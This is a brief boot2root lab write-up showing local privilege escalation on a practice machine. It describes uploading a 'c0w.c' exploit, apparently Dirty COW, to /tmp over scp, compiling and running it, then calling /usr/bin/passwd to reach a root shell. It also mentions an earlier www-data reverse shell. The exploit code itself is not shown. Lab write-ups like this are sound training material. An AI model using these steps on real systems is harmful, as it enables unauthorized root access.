# Boot2Root WriteUp 1
## Step 1

We need a shell to run our exploit so we use the first part of `writeup1`.

We can start when we have the `www-data` reverse shell but its easier whit user `zaz` cause we have an ssh access.

## Step 2

We upload the `c0w.c` exploit to /tmp folder, compile it and run it.

    $> scp ./script/c0w.c laurie@192.168.56.101:/tmp/
    $> gcc -pthread c0w.c
    $> ./a.out

In another window, run `/usr/bin/passwd`.

    $> /usr/bin/passwd
    $> whoami
        root
    $> id -u
        0

## Step 3
Done !